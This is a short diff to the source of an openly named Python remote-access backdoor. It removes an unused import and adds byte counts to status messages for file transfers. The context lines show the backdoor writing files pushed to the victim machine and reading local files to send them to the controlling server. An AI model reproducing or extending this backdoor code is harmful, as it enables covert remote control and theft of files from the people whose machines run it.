@@ -5,7 +5,6 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-import base64
 import ctypes
 import socket
 import subprocess
@@ -222,7 +221,7 @@ class Control:
             with open(file_path, "wb") as file:
                 file.write(output)
 
-            self.socket.send_json(SUCCESS)
+            self.socket.send_json(SUCCESS, f"Total bytes received by client: {len(output)}")
         except Exception as e:
             self.socket.send_json(ERROR, f"Could not open file {e}")
 
@@ -231,7 +230,7 @@ class Control:
             with open(file, "rb") as _file:
                 data = _file.read()
 
-            self.socket.sendall_json(SERVER_FILE_RECV, data, is_bytes=True)
+            self.socket.sendall_json(SERVER_FILE_RECV, data, len(data), is_bytes=True)
         except Exception as e:
             self.socket.send_json(ERROR, f"Error reading file {e}")
 
